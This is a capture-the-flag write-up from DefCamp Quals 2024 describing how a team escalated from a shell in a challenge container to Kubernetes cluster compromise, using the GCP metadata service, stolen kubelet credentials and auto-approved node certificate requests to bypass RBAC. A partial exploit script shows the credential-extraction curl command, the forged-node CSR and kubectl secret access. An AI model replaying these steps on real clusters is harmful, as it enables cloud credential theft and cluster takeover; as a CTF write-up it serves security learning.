---
title: "DefCamp Quals 2024 — CTF Infrastructure Vulnerability"
date: 2024-10-13
draft: false
tags: ["infra", "kubernetes", "gcp", "cloud", "pwn"]
categories: ["DefCamp 2024"]
authors: ["augusto"]
summary: "From a popped shell to full Kubernetes cluster compromise — exploiting GCP metadata, kubelet credentials, and CSR auto-approval to bypass RBAC."
---

## First attempt at pwning Kubernetes

After our dear pwner friend popped a shell in ftp-console he dumped env to check if the flag was there, no flag to be found, but there were instead some interesting environment variables:

```shell
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.59.240.1:443
```

We also found a Kubernetes service account mounted in the container — but it was unprivileged.

## Google Cloud instance metadata service

We discovered GCP's metadata service was reachable at `http://metadata.google.internal/`. After uploading a static cURL build, we snagged a token for the instance's service account — but it had no useful privileges either.

## Creating fake Kubernetes nodes

By extracting `KUBELET_CERT` and `KUBELET_KEY` from the instance metadata, we found we could send Certificate Signing Requests (CSRs) to the K8s control plane — and they got **automatically approved** if they matched certain attributes.

Following [4ARMED's blog post](https://www.4armed.com/blog/hacking-kubelet-on-gke/), we:
1. Generated a new keypair
2. Crafted a CSR mimicking a real node
3. Submitted it — and it was auto-approved within seconds

This gave us node-level access to list all running pods and dump pod specifications.

## Bypassing RBAC

Then we asked ourselves: *how does K8s RBAC check which node is trying to access secrets?* The answer: it uses the requesting node certificate's **Common Name (CN)** attribute.

Since we could craft arbitrary CSRs and get them auto-approved, we could impersonate any node and access any secret in the cluster.

## Full exploit

```python
#!/usr/bin/env python3
from pwn import *
from pathlib import Path
from base64 import b64encode
import os, time, json

exe = ELF("./ftp_server_patched")
libc = ELF("./libc.so.6")
context.binary = exe

certid = int(time.time())

r = remote("34.107.71.117", 31059)
# ... (binary exploitation to get shell) ...

# Extract kubelet credentials from GCP metadata
r.sendlineafter(b"$ ", b"curl -s -H 'Metadata-Flavor: Google' "
    b"'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env' "
    b"| grep ^KUBELET_CERT | awk '{print $2}' | base64 -d > kubelet.crt")

# Generate and submit CSR
os.system('openssl req -nodes -newkey rsa:2048 -keyout k8shack.key '
    '-out k8shack.csr -subj "/O=system:nodes/CN=system:node:arbitraryname"')

# Submit CSR to K8s API → auto-approved!
# Use new cert to list pods and dump secrets
r.sendlineafter(b"$ ", b"kubectl --client-certificate node2.crt "
    b"--client-key k8shack.key --certificate-authority apiserver.crt "
    b"--server https://${KUBERNETES_PORT_443_TCP_ADDR} get pods -o wide")
```

This convinced the admins we deserved those nice extra points, securing 1st place without having to solve that pesky OSINT challenge :P
